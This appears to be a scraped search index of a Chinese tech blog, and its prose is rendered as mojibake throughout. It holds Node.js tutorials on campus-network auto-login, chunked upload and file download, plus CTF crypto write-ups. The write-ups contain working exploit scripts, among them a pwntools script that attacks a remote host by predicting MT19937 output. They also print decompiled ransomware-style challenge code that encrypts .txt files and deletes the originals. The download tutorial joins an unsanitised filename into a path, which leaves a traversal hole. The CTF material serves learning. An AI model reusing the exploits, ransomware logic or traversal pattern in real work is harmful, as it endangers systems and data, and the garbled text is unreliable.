","date":"2025-04-14","objectID":"/tgctf2025/:3:0","tags":["crypto"],"title":"TGCTF2025","uri":"/tgctf2025/"},{"categories":["nodejs"],"content":"nodejså®ç°å®šæ—¶ä»»åŠ¡ ç”¨node-scheduleè¿™ä¸ªæ¨¡ç»„å»å®ç°å®šæ—¶ä»»åŠ¡ ç„¶åè¿™è¾¹å®ç°è‡ªåŠ¨ç™»å½•æ ¡å›­ç½‘çš„(ï¼Œé¦–å…ˆå…ˆbpæŠ“ä¸ªåŒ…ï¼Œå‘ç°é‡Œé¢ä¸œè¥¿æœ‰ç‚¹å¤šï¼Œå°±å†™äº†ä¸€å †é…ç½®æ–‡ä»¶ï¼Œç„¶ååŒ…æˆdockerå»å®šæ—¶å‘é€ config.js const config = { loginUrl: 'http://ip/eportal/InterFace.do?method=login', userId: '', password: '', service: 'ä¸­å›½ç§»åŠ¨', headers: { 'User-Agent': '', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*', 'Origin': '', 'Referer': 'http://ip/eportal/index.jsp', 'Cookie': 'EPORTAL_USER_GROUP=; EPORTAL_COOKIE_PASSWORD=; EPORTAL_COOKIE_DOMAIN=false; EPORTAL_COOKIE_USERNAME=; EPORTAL_COOKIE_SERVER=; EPORTAL_COOKIE_SERVER_NAME=; EPORTAL_COOKIE_SAVEPASSWORD=true; EPORTAL_COOKIE_OPERATORPWD=' } }; export default config; index.js import schedule from 'node-schedule'; import axios from 'axios'; import qs from 'qs'; import config from './config.js'; import fs from 'fs'; import path from 'path'; import { fileURLToPath } from 'url'; const __dirname = path.dirname(fileURLToPath(import.meta.url)); const logDir = path.join(__dirname, 'logs'); // ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨ if (!fs.existsSync(logDir)) { fs.mkdirSync(logDir); } // æ—¥å¿—å‡½æ•° function log(message, isError = false) { const now = new Date(); const dateStr = now.toISOString().split('T')[0]; const timeStr = now.toLocaleString(); const logMessage = `${timeStr} - ${message}\\n`; // æ§åˆ¶å°è¾“å‡º console.log(logMessage); // å†™å…¥æ–‡ä»¶ const logFile = path.join(logDir, `${dateStr}.log`); fs.appendFileSync(logFile, logMessage); // å¦‚æœæ˜¯é”™è¯¯ï¼Œä¹Ÿå†™å…¥é”™è¯¯æ—¥å¿— if (isError) { const errorFile = path.join(logDir, `${dateStr}-error.log`); fs.appendFileSync(errorFile, logMessage); } } async function login() { try { const data = { userId: config.userId, password: config.password, service: config.service, queryString: qs.stringify({ wlanuserip: '', wlanacname: '', ssid: '', nasip: '', snmpagentip: '', mac: '', t: '', url: '', apmac: '', nasid: '', vid: '', port: '', nasportid: '' }), operatorPwd: '', operatorUserId: '', validcode: '', passwordEncrypt: false }; const response = await axios({ method: 'post', url: config.loginUrl, headers: config.headers, data: qs.stringify(data) }); log(`ç™»å½•ç»“æœ: ${JSON.stringify(response.data)}`); } catch (error) { log(`ç™»å½•å¤±è´¥: ${error.message}`, true); } } // æ¯å¤©æ—©ä¸Š7ç‚¹æ‰§è¡Œç™»å½• schedule.scheduleJob('0 7 * * *', login); log('å®šæ—¶ä»»åŠ¡å·²å¯åŠ¨ï¼Œå°†åœ¨æ¯å¤©æ—©ä¸Š7ç‚¹è‡ªåŠ¨ç™»å½•'); // ç«‹å³æ‰§è¡Œä¸€æ¬¡ç™»å½•ï¼Œæµ‹è¯•é…ç½®æ˜¯å¦æ­£ç¡® login(); æ„Ÿè§‰å­¦æ ¡è¿™è¾¹æœ‰ç‚¹æ€ªï¼Œç”šè‡³ä¼šåˆ¤å®šæ˜¯å­¦ç”Ÿè¿˜æ˜¯è€å¸ˆç™»å½•ï¼Œè¿™ç©æ„è¿˜åˆ†çš„ï¼Ÿç½‘é€Ÿä¸ä¸€æ ·å‘—bro dockerfile FROM node:18-alpine WORKDIR /app COPY package*.json ./ RUN npm install COPY . . CMD [\"node\", \"index.js\"] docker-compose.yml version: '3' services: campus-login: build: . container_name: campus-login restart: always environment: - TZ=Asia/Shanghai volumes: - ./config.js:/app/config.js - ./logs:/app/logs logging: driver: \"json-file\" options: max-size: \"10m\" max-file: \"3\" ç„¶åå°±å¥½äº†ï¼Œåªå¾—ä¸€æçš„æ˜¯Cronè¡¨è¾¾å¼ï¼Œå’Œlinuxçš„æ˜¯ä¸€æ ·çš„ * * * * * * â”¬ â”¬ â”¬ â”¬ â”¬ â”¬ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â””â”€â”€ æ˜ŸæœŸï¼ˆ0 - 6ï¼Œ0è¡¨ç¤ºæ˜ŸæœŸæ—¥ï¼‰ â”‚ â”‚ â”‚ â”‚ â””â”€â”€â”€â”€â”€ æœˆä»½ï¼ˆ1 - 12ï¼‰ â”‚ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ æ—¥ï¼ˆ1 - 31ï¼‰ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ å°æ—¶ï¼ˆ0 - 23ï¼‰ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ åˆ†é’Ÿï¼ˆ0 - 59ï¼‰ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ç§’ï¼ˆ0 - 59ï¼‰ ","date":"2025-04-09","objectID":"/study_nodejs5/:1:0","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ5ã€","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"æ–‡ä»¶ä¸Šä¼  è¿™ä¸ªé—®é¢˜å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯å‰ç«¯å‘åç«¯å‘é€ä¸€ä¸ªæ–‡ä»¶ï¼Œåç«¯æ¥æ”¶åˆ°æ–‡ä»¶åï¼Œä¿å­˜åˆ°æŒ‡å®šä½ç½®ï¼Œç„¶åè¿”å›ç»™å‰ç«¯ä¸€ä¸ªçŠ¶æ€ç ï¼Œè¡¨ç¤ºä¸Šä¼ æˆåŠŸæˆ–è€…å¤±è´¥ã€‚ ä½†æ˜¯å½“æ–‡ä»¶å¾ˆå¤§æ—¶å°±ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœæˆ‘ç½‘ç»œçªç„¶å´©äº†ï¼Œå†æ•´ä½“é‡æ–°ä¸Šä¼ ï¼Œé‚£ä¸å°±ç‚¸äº†å—ï¼Ÿæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ†æ®µä¸Šä¼ ï¼Œæ¯”å¦‚ä¸€ä¸ªæ–‡ä»¶è¢«åˆ†æˆäº†åä»½ï¼Œæˆ‘åœ¨ä¸Šä¼ åˆ°æœ€åä¸€ç‚¹æ—¶å¯„äº†ï¼Œé‡æ–°ä¸Šä¼ æ—¶åªéœ€ä¸Šä¼ æœ€åä¸€ä»½å³å¯ ","date":"2025-04-09","objectID":"/study_nodejs5/:2:0","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ5ã€","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"å‰ç«¯éƒ¨åˆ† \u003cinput id=\"file\" type=\"file\"\u003e \u003c!--ç”¨æ¥ä¸Šä¼ æ–‡ä»¶--\u003e å®šä¹‰chunkså»åˆ‡ç‰‡ æ–‡ä»¶åˆ‡ç‰‡ file æ¥å—æ–‡ä»¶å¯¹è±¡ï¼Œæ³¨æ„fileçš„åº•å±‚æ˜¯ç»§æ‰¿äºblobçš„å› æ­¤ä»–å¯ä»¥è°ƒç”¨blobçš„æ–¹æ³•ï¼Œsliceè¿›è¡Œåˆ‡ç‰‡ï¼Œsizeå°±æ˜¯æ¯ä¸ªåˆ‡ç‰‡çš„å¤§å° const file = document.getElementById('file') file.addEventListener('change', (event) =\u003e { const file = event.target.files[0] //è·å–æ–‡ä»¶ä¿¡æ¯ const chunks = chunkFun(file) uploadFile(chunks) }) const chunkFun = (file, size = 1024 * 1024 * 4) =\u003e { const chunks = [] for (let i = 0; i \u003c file.size; i += size) { chunks.push(file.slice(i, i + size)) } return chunks } å¾ªç¯è°ƒç”¨æ¥å£ä¸Šä¼ ï¼Œå¹¶ä¸”å­˜å‚¨ä¸€äº›ä¿¡æ¯ï¼Œå½“å‰åˆ†ç‰‡çš„ç´¢å¼•ï¼Œæ³¨æ„fileå¿…é¡»å†™åœ¨æœ€åä¸€ä¸ªï¼Œå› ä¸ºnodejsç«¯çš„multer ä¼šæŒ‰ç…§é¡ºåºå»è¯»çš„ï¼Œä¸ç„¶è¯»ä¸åˆ°å‚æ•°, æœ€åé€šè¿‡promise.all å¹¶å‘å‘é€è¯·æ±‚ï¼Œç­‰å¾…æ‰€æœ‰è¯·æ±‚å‘é€å®Œæˆï¼Œé€šçŸ¥åç«¯åˆå¹¶åˆ‡ç‰‡ const upload = (chunks) =\u003e { const list = [] for (let i = 0; i \u003c chunks.length; i++) { const formData = new FormData() formData.append('index', i) formData.append('filename', zsm) formData.append('flie', chunks[i]) list.push(fetch('http://localhost:3000/upload', { method: 'POST', body: formData })) } Promise.all(list).then(res =\u003e { fetch('http://localhost:3000/merge', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ filename: zsm }) }) console.log('ä¸Šä¼ æˆåŠŸ') }) } ","date":"2025-04-09","objectID":"/study_nodejs5/:2:1","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ5ã€","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"nodeç«¯ æ¯”è¾ƒå€¼å¾—æ³¨æ„çš„é—®é¢˜æ˜¯ä¸Šä¼ æ—¶æ˜¯åˆ†å—çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆå¹¶ï¼Œå°†åˆ†å—çš„å­˜å…¥uploadsï¼Œç„¶åè¯»å–å‡ºæ¥æ’åºåå†åˆå¹¶å³å¯ï¼Œä¸¥è°¨ä¸€ç‚¹åŠ ç‚¹åˆ¤æ–­ä»€ä¹ˆçš„ import express from 'express' import multer from 'multer' import cors from 'cors' import fs from 'fs/promises' import { existsSync, mkdirSync } from 'fs' import path from 'path' // ç¡®ä¿ä¸Šä¼ ç›®å½•å’Œè§†é¢‘ç›®å½•å­˜åœ¨ const uploadDir = path.join(process.cwd(), 'uploads') const videoDir = path.join(process.cwd(), 'video') ;[uploadDir, videoDir].forEach(dir =\u003e { if (!existsSync(dir)) { mkdirSync(dir, { recursive: true }) } }) const storage = multer.diskStorage({ destination: function (req, file, cb) { cb(null, 'uploads/') }, filename(req, file, cb) { cb(null, `${req.body.index}-${req.body.filename}`) } }) // æ·»åŠ æ–‡ä»¶è¿‡æ»¤å™¨ const fileFilter = (req, file, cb) =\u003e { // è®°å½•æ–‡ä»¶ä¿¡æ¯ console.log('ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯:', { fieldname: file.fieldname, originalname: file.originalname, mimetype: file.mimetype, size: file.size }) // æ¥å—æ‰€æœ‰æ–‡ä»¶ç±»å‹ cb(null, true) } const upload = multer({ storage, fileFilter, limits: { fileSize: 500 * 1024 * 1024, // å¢åŠ æ–‡ä»¶å¤§å°é™åˆ¶åˆ°500MB } }) const app = express() app.use(cors()) app.use(express.json()) // é”™è¯¯å¤„ç†ä¸­é—´ä»¶ const errorHandler = (err, req, res, next) =\u003e { console.error(err) res.status(500).json({ error: err.message || 'æœåŠ¡å™¨å†…éƒ¨é”™è¯¯' }) } app.post('/upload', upload.single('file'), (req, res) =\u003e { try { if (!req.file) { return res.status(400).json({ error: 'æ²¡æœ‰æ¥æ”¶åˆ°æ–‡ä»¶' }) } res.json({ message: 'æ–‡ä»¶ä¸Šä¼ æˆåŠŸ' }) } catch (error) { next(error) } }) app.post('/merge', async (req, res, next) =\u003e { try { if (!req.body.filename) { return res.status(400).json({ error: 'æœªæä¾›æ–‡ä»¶å' }) } const files = await fs.readdir(uploadDir) if (files.length === 0) { return res.status(400).json({ error: 'æ²¡æœ‰æ‰¾åˆ°éœ€è¦åˆå¹¶çš„æ–‡ä»¶' }) } // æ’åº files.sort((a, b) =\u003e parseInt(a.split('-')[0]) - parseInt(b.split('-')[0])) // ä½¿ç”¨åŸå§‹æ–‡ä»¶æ‰©å±•å const fileExtension = path.extname(req.body.filename) || '' const outputPath = path.join(videoDir, `${req.body.filename}${fileExtension}`) // ä½¿ç”¨ Promise.all å¹¶è¡Œè¯»å–æ‰€æœ‰æ–‡ä»¶ const fileContents = await Promise.all( files.map(file =\u003e fs.readFile(path.join(uploadDir, file))) ) // åˆå¹¶æ–‡ä»¶ await fs.writeFile(outputPath, Buffer.concat(fileContents)) // æ¸…ç†ä¸´æ—¶æ–‡ä»¶ await Promise.all( files.map(file =\u003e fs.unlink(path.join(uploadDir, file))) ) res.json({ message: 'æ–‡ä»¶åˆå¹¶æˆåŠŸ', path: outputPath, size: fileContents.reduce((acc, curr) =\u003e acc + curr.length, 0) }) } catch (error) { next(error) } }) app.use(errorHandler) app.listen(3000, () =\u003e { console.log('server is running on port 3000') }) ","date":"2025-04-09","objectID":"/study_nodejs5/:2:2","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ5ã€","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"æ–‡ä»¶æµä¸‹è½½ æ–‡ä»¶æµä¸‹è½½æ˜¯ä¸€ç§é€šè¿‡å°†æ–‡ä»¶å†…å®¹ä»¥æµçš„å½¢å¼å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®ç°æ–‡ä»¶ä¸‹è½½çš„æ–¹æ³•ã€‚å®ƒé€‚ç”¨äºå¤„ç†å¤§å‹æ–‡ä»¶æˆ–éœ€è¦å®æ—¶ç”Ÿæˆæ–‡ä»¶å†…å®¹çš„æƒ…å†µã€‚ ","date":"2025-04-09","objectID":"/study_nodejs5/:3:0","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ5ã€","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"å‰ç«¯å®ç° \u003cbody\u003e \u003cbutton id=\"btn\"\u003eä¸‹è½½æ–‡ä»¶\u003c/button\u003e \u003cscript\u003e const btn = document.getElementById('btn'); btn.addEventListener('click', async () =\u003e { try { const response = await fetch('http://localhost:3000/download', { method: 'POST', body: JSON.stringify({ fileName: 'test.txt' }), headers: { 'Content-Type': 'application/json' } }); if (!response.ok) { const error = await response.json(); throw new Error(error.error || 'ä¸‹è½½å¤±è´¥'); } const blob = await response.blob(); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = 'test.txt'; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url); } catch (error) { console.error('ä¸‹è½½å‡ºé”™:', error); alert(error.message); } }); \u003c/script\u003e \u003c/body\u003e å‰ç«¯æ ¸å¿ƒé€»è¾‘å°±æ˜¯æ¥å—çš„è¿”å›å€¼æ˜¯æµçš„æ–¹å¼arrayBuffer,è½¬æˆblobï¼Œç”Ÿæˆä¸‹è½½é“¾æ¥ï¼Œæ¨¡æ‹Ÿaæ ‡ç­¾ç‚¹å‡»ä¸‹è½½ ","date":"2025-04-09","objectID":"/study_nodejs5/:3:1","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ5ã€","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"nodeç«¯ ä¸»è¦çš„åœ°æ–¹åœ¨äºå“åº”å¤´ Content-Type æŒ‡å®šä¸‹è½½æ–‡ä»¶çš„ MIME ç±»å‹ application/octet-streamï¼ˆäºŒè¿›åˆ¶æµæ•°æ®ï¼‰ application/pdfï¼šAdobe PDF æ–‡ä»¶ã€‚ application/jsonï¼šJSON æ•°æ®æ–‡ä»¶ image/jpegï¼šJPEG å›¾åƒæ–‡ä»¶ Content-Disposition æŒ‡å®šæœåŠ¡å™¨è¿”å›çš„å†…å®¹åœ¨æµè§ˆå™¨ä¸­çš„å¤„ç†æ–¹å¼ã€‚å®ƒå¯ä»¥ç”¨äºæ§åˆ¶æ–‡ä»¶ä¸‹è½½ã€å†…è”æ˜¾ç¤ºæˆ–å…¶ä»–å¤„ç†æ–¹å¼ attachmentï¼šæŒ‡ç¤ºæµè§ˆå™¨å°†å“åº”å†…å®¹ä½œä¸ºé™„ä»¶ä¸‹è½½ã€‚é€šå¸¸ä¸Â filenameÂ å‚æ•°ä¸€èµ·ä½¿ç”¨ï¼Œç”¨äºæŒ‡å®šä¸‹è½½æ–‡ä»¶çš„åç§° inlineï¼šæŒ‡ç¤ºæµè§ˆå™¨ç›´æ¥åœ¨æµè§ˆå™¨çª—å£ä¸­æ‰“å¼€å“åº”å†…å®¹ï¼Œå¦‚æœå†…å®¹æ˜¯å¯è¯†åˆ«çš„æ–‡ä»¶ç±»å‹ï¼ˆä¾‹å¦‚å›¾ç‰‡æˆ– PDFï¼‰ï¼Œåˆ™åœ¨æµè§ˆå™¨ä¸­å†…è”æ˜¾ç¤º import express from \"express\"; import cors from \"cors\"; import fs from \"fs\"; import path from \"path\"; const app = express(); app.use(cors()); app.use(express.json()) app.post('/download', (req, res) =\u003e { try { const fileName = req.body.fileName; if (!fileName) { return res.status(400).json({ error: 'æ–‡ä»¶åä¸èƒ½ä¸ºç©º' }); } const filepath = path.join(process.cwd(), 'static', fileName); // æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ if (!fs.existsSync(filepath)) { return res.status(404).json({ error: 'æ–‡ä»¶ä¸å­˜åœ¨' }); } const content = fs.readFileSync(filepath); res.setHeader('Content-Type', 'application/octet-stream'); res.setHeader('Content-Disposition', `attachment; filename=${fileName}`); res.send(content); } catch (error) { console.error('ä¸‹è½½æ–‡ä»¶æ—¶å‡ºé”™:', error); res.status(500).json({ error: 'æœåŠ¡å™¨å†…éƒ¨é”™è¯¯' }); } }); app.listen(3000, () =\u003e { console.log(\"Server is running on port 3000\"); }); ","date":"2025-04-09","objectID":"/study_nodejs5/:3:2","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ5ã€","uri":"/study_nodejs5/"},{"categories":["CTF"],"content":"å‰è¨€ 25å¹´å¼€å§‹ä»¥æ¥æ‰“çš„æœ€é«˜è´¨é‡çš„å¯†ç äº†ï¼Ÿ ","date":"2025-04-07","objectID":"/xyctf2025/:1:0","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-04-07","objectID":"/xyctf2025/:2:0","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"Division æŠ¢äº†ä¸ªè¡€ï¼Œæ€ªä¸å¥½æ„æ€çš„ task.py import random print('----Welcome to my division calc----') print(''' menu: [1] Division calc [2] Get flag ''') while True: choose = input(': \u003e\u003e\u003e ') if choose == '1': try: denominator = int(input('input the denominator: \u003e\u003e\u003e ')) except: print('INPUT NUMBERS') continue nominator = random.getrandbits(32) if denominator == '0': print('NO YOU DONT') continue else: print(f'{nominator}//{denominator} = {nominator//denominator}') elif choose == '2': try: ans = input('input the answer: \u003e\u003e\u003e ') rand1 = random.getrandbits(11000) rand2 = random.getrandbits(10000) correct_ans = rand1 // rand2 if correct_ans == int(ans): print('WOW') with open('flag', 'r') as f: print(f'Here is your flag: {f.read()}') else: print(f'NOPE, the correct answer is {correct_ans}') except: print('INPUT NUMBERS') else: print('Invalid choice') ç¬¬ä¸€æ—¶é—´æ‹¿åˆ°å°±çŸ¥é“æ˜¯mt19937é¢„æµ‹éšæœºæ•°ï¼Œ1é‡Œé¢è¾“å…¥1å°±å¯ä»¥æ‹¿åˆ°æ¯æ¬¡çš„éšæœºæ•°ä»è€Œé¢„æµ‹äº† exp.py from pwn import remote import random from randcrack import RandCrack rc = RandCrack() conn = remote('8.147.132.32', 22975) outputs = [] for _ in range(624): conn.recvuntil(b': \u003e\u003e\u003e ') conn.sendline(b'1') conn.recvuntil(b'input the denominator: \u003e\u003e\u003e ') conn.sendline(b'1') line = conn.recvline().decode().strip() nominator = int(line.split('=')[1].strip()) outputs.append(nominator) rc.submit(nominator) rand1 =rc.predict_getrandbits(11000) rand2 = rc.predict_getrandbits(10000) correct_ans = rand1 // rand2 print(correct_ans) conn.recvuntil(b': \u003e\u003e\u003e ') conn.sendline(b'2') conn.recvuntil(b'input the answer: \u003e\u003e\u003e') conn.sendline(correct_ans) conn.interactive() ","date":"2025-04-07","objectID":"/xyctf2025/:2:1","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"Complex_signin task.py from Crypto.Util.number import * from Crypto.Cipher import ChaCha20 import hashlib from secret import flag class Complex: def __init__(self, re, im): self.re = re self.im = im def __mul__(self, c): re_ = self.re * c.re - self.im * c.im im_ = self.re * c.im + self.im * c.re return Complex(re_, im_) def __eq__(self, c): return self.re == c.re and self.im == c.im def __rshift__(self, m): return Complex(self.re \u003e\u003e m, self.im \u003e\u003e m) def __lshift__(self, m): return Complex(self.re \u003c\u003c m, self.im \u003c\u003c m) def __str__(self): if self.im == 0: return str(self.re) elif self.re == 0: if abs(self.im) == 1: return f\"{'-' if self.im \u003c 0 else ''}i\" else: return f\"{self.im}i\" else: return f\"{self.re} {'+' if self.im \u003e 0 else '-'} {abs(self.im)}i\" def tolist(self): return [self.re, self.im] def complex_pow(c, exp, n): result = Complex(1, 0) while exp \u003e 0: if exp \u0026 1: result = result * c result.re = result.re % n result.im = result.im % n c = c * c c.re = c.re % n c.im = c.im % n exp \u003e\u003e= 1 return result bits = 128 p = getPrime(1024) q = getPrime(1024) n = p * q m = Complex(getRandomRange(1, n), getRandomRange(1, n)) e = 3 c = complex_pow(m, e, n) print(f\"n = {n}\") print(f\"mh = {(m \u003e\u003e bits \u003c\u003c bits).tolist()}\") print(f\"C = {c.tolist()}\") print(f\"enc = {ChaCha20.new(key=hashlib.sha256(str(m.re + m.im).encode()).digest(), nonce=b'Pr3d1ctmyxjj').encrypt(flag)}\") é¦–å…ˆæ˜¯ä¸ªå¤æ•°åŸŸçš„ä¸œè¥¿ï¼Œç„¶åæ˜¯ä¸ªmé«˜ä½æ”»å‡»ï¼Œæ³¨æ„åˆ°å¤æ•°åŸŸå’Œå®æ•°åŸŸå¤„ç†æ–¹æ³•ä¸ä¸€æ · é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨æœ‰äº†å®éƒ¨å’Œè™šéƒ¨ï¼Œm\u003e\u003ebitsæ—¶å¯ä»¥ç±»æ¯”äºå®éƒ¨è™šéƒ¨ä¸€å—ä½ç§»ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸èƒ½åˆ†å¼€é«˜ä½è®¡ç®—ï¼Œé‚£ä¹ˆå°±æœ‰äº†ä¸¤ä¸ªæœªçŸ¥ï¼Œbitsæ˜¯æ»¡è¶³copperçš„ï¼Œç›´æ¥æ‰“å°±è¡Œäº† exp.py import itertools from Crypto.Util.number import * from tqdm import * def small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m + 1): base = N ^ (m - i) * f ^ i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] k = 128 n = mh = C = # å®šä¹‰å¤šé¡¹å¼ç¯ PR.\u003cx, y\u003e = PolynomialRing(Zmod(n)) a = mh[0] + x # x æ˜¯ al b = mh[1] + y # y æ˜¯ bl f1 = (a^3 - 3*a*b^2) - C[0] # å®éƒ¨æ–¹ç¨‹ f2 = (3*a^2*b - b^3) - C[1] # è™šéƒ¨æ–¹ç¨‹ res = small_roots(f1,bounds=(2^128,2^128),m=1,d=3) if res != []: print(res) x= y= from Crypto.Cipher import ChaCha20 import hashlib n = mh = enc = x= y= s = (mh[0]) + (mh[1])+x+y key = hashlib.sha256(str(s).encode()).digest() cipher = ChaCha20.new(key=key, nonce=b'Pr3d1ctmyxjj') flag = cipher.decrypt(enc) print(flag) ","date":"2025-04-07","objectID":"/xyctf2025/:2:2","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"å‹’ç´¢ç—…æ¯’ æ‹‰ä¸‹æ¥å‘ç°æ˜¯ä¸ªexeï¼ŒçŒœæ˜¯pythonæ‰“åŒ…å‡ºæ¥çš„ï¼Œæ‰”åˆ°https://pyinstxtractor-web.netlify.app æ‹†å¼€ï¼Œæ‹¿åˆ°pycå’Œpub.keyå’Œencï¼Œç„¶åpycè½¬py https://www.lddgo.net/string/pyc-compile-decompile task.py # Visit https://www.lddgo.net/string/pyc-compile-decompile for more information # Version : Python 3.8 ''' Created on Sun Mar 30 18:25:08 2025 @author: Crypto0 import re import base64 import os import sys from gmssl import sm4 from Crypto.Util.Padding import pad import binascii from random import shuffle, randrange N = 49 p = 3 q = 128 d = 3 assert q \u003e (6 * d + 1) * p R.\u003cx\u003e = ZZ[] def generate_T(d1, d2): assert N \u003e= d1 + d2 s = [1] * d1 + [-1] * d2 + [0] * (N - d1 - d2) shuffle(s) return R(s) def invert_mod_prime(f, p): Rp = R.change_ring(Integers(p)).quotient(x^N - 1) return R(lift(1 / Rp(f))) def convolution(f, g): return (f * g) % (x^N - 1) def lift_mod(f, q): return R([((f[i] + q // 2) % q) - q // 2 for i in range(N)]) def poly_mod(f, q): return R([f[i] % q for i in range(N)]) def invert_mod_pow2(f, q): assert q.is_power_of(2) g = invert_mod_prime(f, 2) while True: r = lift_mod(convolution(g, f), q) if r == 1: return g g = lift_mod(convolution(g, 2 - r), q) def generate_message(): return R([randrange(p) - 1 for _ in range(N)]) def generate_key(): while True: try: f = generate_T(d + 1, d) g = generate_T(d, d) Fp = poly_mod(invert_mod_prime(f, p), p) Fq = poly_mod(invert_mod_pow2(f, q), q) break except: continue h = poly_mod(convolution(Fq, g), q) return h, (f, g) def encrypt_message(m, h): e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q) return e def save_ntru_keys(): h, secret = generate_key() with open(\"pub_key.txt\", \"w\") as f: f.write(str(h)) m = generate_message() with open(\"priv_key.txt\", \"w\") as f: f.write(str(m)) e = encrypt_message(m, h) with open(\"enc.txt\", \"w\") as f: f.write(str(e)) def terms(poly_str): terms = [] pattern = r\\'([+-]?\\\\s*x\\\\^?\\\\d*|[-+]?\\\\s*\\\\d+)\\' matches = re.finditer(pattern, poly_str.replace(\\' \\', \\'\\')) for match in matches: term = match.group() if term == \\'+x\\' or term == \\'x\\': terms.append(1) elif term == \\'-x\\': terms.append(-1) elif \\'x^\\' in term: coeff_part = term.split(\\'x^\\')[0] exponent = int(term.split(\\'x^\\')[1]) if not coeff_part or coeff_part == \\'+\\': coeff = 1 elif coeff_part == \\'-\\': coeff = -1 else: coeff = int(coeff_part) terms.append(coeff * exponent) elif \\'x\\' in term: coeff_part = term.split(\\'x\\')[0] if not coeff_part or coeff_part == \\'+\\': terms.append(1) elif coeff_part == \\'-\\': terms.append(-1) else: terms.append(int(coeff_part)) else: if term == \\'+1\\' or term == \\'1\\': terms.append(0) terms.append(-0) return terms def gen_key(poly_terms): binary = [0] * 128 for term in poly_terms: exponent = abs(term) if term \u003e 0 and exponent \u003c= 127: binary[127 - exponent] = 1 binary_str = \\'\\'.join(map(str, binary)) hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32) return hex_key def read_polynomial_from_file(filename): with open(filename, \\'r\\') as file: return file.read().strip() def sm4_encrypt(key, plaintext): assert len(key) == 16, \"SM4 key must be 16 bytes\" cipher = sm4.CryptSM4() cipher.set_key(key, sm4.SM4_ENCRYPT) padded_plaintext = pad(plaintext, 16) return cipher.crypt_ecb(padded_plaintext) def sm4_encrypt_file(input_path, output_path, key): with open(input_path, \\'rb\\') as f: plaintext = f.read() ciphertext = sm4_encrypt(key, plaintext) with open(output_path, \\'wb\\') as f: f.write(ciphertext) def resource_path(relative_path): if getattr(sys, \\'frozen\\', False): base_path = sys._MEIPASS else: base_path = os.path.abspath(\".\") return os.path.join(base_path, relative_path) def encrypt_directory(directory, sm4_key, extensions=[\".txt\"]): if not os.path.exists(directory): print(f\"Directory does not exist: {directory}\") return for root, _, files in os.walk(directory): for file in files: if any(file.endswith(ext) for ext in extensions): input_path = os.path.join(root, file) output_path = input_path + \".enc\" try: sm4_encrypt_file(input_path, output_path, sm4_key) os.remove(input_path) print(f\"Encrypted:","date":"2025-04-07","objectID":"/xyctf2025/:2:3","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"reed task.py import string import random from secret import flag assert flag.startswith('XYCTF{') and flag.endswith('}') flag = flag.rstrip('}').lstrip('XYCTF{') table = string.ascii_letters + string.digits assert all(i in table for i in flag) r = random.Random() class PRNG: def __init__(self, seed): self.a = 1145140 self.b = 19198100 random.seed(seed) def next(self): x = random.randint(self.a, self.b) random.seed(x ** 2 + 1) return x def round(self, k): for _ in range(k): x = self.next() return x def encrypt(msg, a, b): c = [(a * table.index(m) + b) % 19198111 for m in msg] return c seed = int(input('give me seed: ')) prng = PRNG(seed) a = 